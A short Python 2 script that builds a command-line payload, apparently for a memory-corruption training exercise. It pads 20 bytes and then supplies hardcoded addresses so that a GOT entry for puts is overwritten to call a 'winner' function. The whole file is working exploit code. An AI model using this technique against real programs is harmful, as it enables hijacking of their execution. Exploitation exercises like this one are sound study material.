padding = "A" * 20
entrance_puts = '\x74\x97\x04\x08'
argv_1 = padding + entrance_puts
winner_addr = '\x94\x84\x04\x08'
argv_2 = winner_addr

payload = argv_1 + " " + argv_2
print payload